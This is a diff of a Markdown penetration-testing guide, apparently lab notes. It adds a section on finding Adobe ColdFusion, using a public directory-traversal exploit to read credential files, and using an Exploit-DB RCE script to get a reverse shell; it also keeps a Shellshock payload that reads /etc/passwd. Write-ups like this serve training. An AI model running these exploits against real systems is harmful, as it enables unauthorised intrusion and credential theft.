@@ -38,8 +38,9 @@ This document outlines common techniques for identifying and exploiting vulnerab
     - [Attacking Tomcat CGI](#attacking-tomcat-cgi)
     - [Attacking CGI Applications](#attacking-cgi-applications)
   
-  - [Thick Client Applications](#thick-client-applications)
-    - [Attacking Thick Client Applications](#attacking-thick-client-applications)
+  - [Miscellaneous Applications](#miscellaneous-applications)
+    - [Cold Fusion - Discovery and Enumeration](#cold-fusion---discovery-and-enumeration)
+    - [Attacking ColdFusion](#attacking-coldfusion)
 
 
 ---
@@ -1751,7 +1752,7 @@ curl -i http://10.129.205.27/cgi-bin/access.cgi
 
 Despite the lack of visible functionality, the script may still process HTTP headers—making it a viable target for Shellshock.
 
-To test for Shellshock, we inject a payload into the `User-Agent` HTTP header, which is commonly exposed to CGI environment variables:
+To test for `Shellshock`, we inject a payload into the `User-Agent` HTTP header, which is commonly exposed to CGI environment variables:
 
 ```bash
 curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
@@ -1773,8 +1774,204 @@ A reverse shell connection is successfully established:
 
 ---
 
-## Thick Client Applications
+## Miscellaneous Applications
 
 ---
 
-### Attacking Thick Client Applications
+### Cold Fusion - Discovery and Enumeration
+
+**Adobe ColdFusion** is a Java-based web application development platform used to build dynamic, data-driven web applications. It is commonly deployed in enterprise environments and integrates with databases, APIs, directory services, and messaging systems.
+
+ColdFusion applications are written using **ColdFusion Markup Language (CFML)**, a proprietary language with HTML-like syntax. CFML provides built-in tags and functions for common web application tasks such as database access, session handling, file operations, and web services.
+
+One of the most commonly used CFML tags is `cfquery`, which allows developers to execute SQL statements against a configured datasource.
+
+Example:
+
+```cfml
+<cfquery name="myQuery" datasource="myDataSource">
+  SELECT *
+  FROM myTable
+</cfquery>
+```
+
+The result set can then be processed using a `cfloop` construct:
+
+```cfml
+<cfloop query="myQuery">
+  <p>#myQuery.firstName# #myQuery.lastName#</p>
+</cfloop>
+```
+
+Because CFML enables direct interaction with backend systems, vulnerabilities in ColdFusion applications often have **high impact**, including database compromise and remote code execution.
+
+ColdFusion has a long history of critical vulnerabilities, many of which affect default or misconfigured installations. Notable examples include:
+
+- [CVE-2024-20767](https://nvd.nist.gov/vuln/detail/CVE-2024-20767)
+  - Arbitrary file read
+- [CVE-2021-21087](https://nvd.nist.gov/vuln/detail/cve-2021-21087)
+  - Improper restriction of JSP source uploads
+- [CVE-2020-24453](https://nvd.nist.gov/vuln/detail/CVE-2020-24453)
+  - Active Directory integration misconfiguration
+
+Due to its prevalence in legacy enterprise environments, unpatched ColdFusion servers are frequently encountered during internal penetration tests.
+
+ColdFusion exposes several ports by default:
+
+| Port       | Protocol               |
+| ---------- | ---------------------- | 
+| `25`       | `SMTP`                 | 
+| `80`       | `HTTP`                 | 
+| `443`      | `HTTPS`                | 
+| `1935`     | `RPC`                  | 
+| `5500`     | `Server Monitor`       | 
+| `8500`     | `SSL`                  |  
+
+There are multiple reliable ways to identify a ColdFusion installation:
+
+- Port Scanning
+  - Focus on ports `80`, `443` and `8500`
+- File Extensions
+  - ColdFusion pages tpycally use `.cfm` or `.cfc`
+- HTTP Headers
+  - Headers such as `Server: ColdFusion` or `X-Powered-By: ColdFusion`
+- Error Messages
+  - Error messages may reference ColdFusion components
+- Default Files
+  - Default files include `admin.cfm` or `CFIDE/administrator/index.cfm`
+
+**ColdFusion Identification**
+
+We begin with a full TCP port scan:
+
+```bash
+sudo nmap -p- --sV --open 10.129.169.107
+```
+
+The port scan reveals three open ports:
+
+- `135`
+- `8500`
+- `49154`
+
+![Filtered output](images/coldfusion.PNG)
+
+Browsing to port `8500` reveals that directory listing is enabled. Two directories are exposed:
+
+- `CFIDE`
+- `cfdocs`
+
+![Filtered output](images/coldfusion2.PNG)
+
+Both directories are default components of a ColdFusion installation, strongly indicating that ColdFusion is running on the target.
+
+Further browsing reveals multiple files with the `.cfm` extension:
+
+![Filtered output](images/coldfusion3.PNG)
+
+Navigating to the administrator interface confirms the presence of ColdFusion:
+
+```
+CFIDE/administrator
+```
+
+The ColdFusion Administrator login page is displayed:
+
+![Filtered output](images/coldfusion4.PNG)
+
+At this point, ColdFusion is **positively identified** on the target system.
+
+---
+
+### Attacking ColdFusion
+
+From the enumeration phase, we confirmed that the target is running **Adobe ColdFusion 8**, a legacy version with multiple publicly known vulnerabilities. The next logical step is to search for existing exploits that match the identified version.
+
+A convenient way to do this is with `Searchsploit`, a command-line interface for the **Exploit Database (Exploit-DB)**.
+
+We begin by querying Exploit-DB for ColdFusion-related exploits:
+
+```bash
+searchsploit adobe coldfusion
+```
+
+![Filtered output](images/coldfusion5.PNG)
+
+The results reveal several relevant exploits. Two stand out as particularly useful:
+
+- Adobe ColdFusion - Directory Traversal
+  - multiple/remote/14641.py
+- Adobe ColdFusion 8 - Remote Command Execution (RCE)
+  - cfm/webapps/50057.py
+
+[CVE-2010-2861](https://nvd.nist.gov/vuln/detail/cve-2010-2861), is a directory traversal flaw in ColdFusion that allows an unauthenticated attacker to read arbitrary files on the system.
+
+This vulnerability can be exploited against several ColdFusion administrative endpoints, including:
+
+- `CFIDE/administrator/settings/mappings.cfm`
+- `logging/settings.cfm`
+- `datasources/index.cfm`
+- `j2eepackaging/editarchive.cfm`
+- `CFIDE/administrator/enter.cfm`
+
+To display the full path of the exploit:
+
+```bash
+searchsploit -p 14641
+```
+
+![Filtered output](images/coldfusion6.PNG)
+
+Copy the exploit into the current working directory:
+
+```bash
+cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+```
+
+We execute the exploit and target the `password.properties file`, which contains ColdFusion credential material:
+
+```bash
+python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+```
+
+The contents of `password.properties` are successfully retrieved, confirming that the target is vulnerable to `CVE-2010-2861`.
+
+![Filtered output](images/coldfusion7.PNG)
+
+At this stage, we have proven arbitrary file read and may be able to extract hashed credentials or configuration secrets.
+
+The second and more impactful vulnerability is [CVE-2009-2265](https://nvd.nist.gov/vuln/detail/CVE-2009-2265), an **unauthenticated remote code execution** flaw affecting ColdFusion 8.
+
+This vulnerability allows an attacker to upload arbitrary files to the server, leading directly to command execution and full system compromise.
+
+Display the full exploit path:
+
+```bash
+searchsploit -p 50057
+```
+
+Copy the exploit locally:
+
+```bash
+cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+```
+
+Edit the script to configure the following values:
+
+- `lhost`
+- `lport` 
+- `rhost` 
+
+![Filtered output](images/coldfusion8.PNG)
+
+Run the exploit:
+
+```bash
+python3 50057.py
+```
+
+A reverse shell is successfully established:
+
+![Filtered output](images/coldfusion9.PNG)
+
+---
